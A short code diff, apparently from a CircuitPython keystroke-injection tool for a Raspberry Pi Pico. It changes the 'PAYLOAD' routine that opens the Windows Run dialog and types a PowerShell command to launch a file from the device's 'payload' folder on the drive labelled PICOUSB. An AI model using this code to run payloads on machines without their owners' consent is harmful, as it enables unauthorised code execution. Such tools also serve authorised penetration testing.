@@ -44,15 +44,19 @@ def execute_command(function, command):
                 keys[idx] = getattr(Keycode, command[idx])
             kb.send(*keys)
     elif function == "PAYLOAD":
-        kb.send(Keycode.WINDOWS,Keycode.R)
+        kb.send(Keycode.WINDOWS, Keycode.R)
         time.sleep(0.1)
-        layout.write(
-            r'cmd /c "timeout /t 5 >nul & for /f \"tokens=2 delims==\" %i in (\'wmic logicaldisk where \"VolumeName=\'PicoUSB\'\" get DeviceID /value\') do start \"\" \"%i\\payload\\' + command
+        volume_label = "PICOUSB"
+        powershell_cmd = (
+            'powershell -NoExit -Command "Start-Sleep 10; '
+            'Get-Volume | Where-Object {$_.FileSystemLabel -eq \'' + volume_label + '\'} | '
+            'ForEach-Object {Start-Process \"$($_.DriveLetter):\\payload\\' + command + '\"}"'
         )
+        layout.write(powershell_cmd)
+        time.sleep(3)
         kb.send(Keycode.ENTER)
         time.sleep(0.1)
         microcontroller.nvm[0] = 1
-        microcontroller.on_next_reset(microcontroller.RunMode.SAFE_MODE)
         microcontroller.reset()
     elif function == "WRITE":
         layout.write(command)
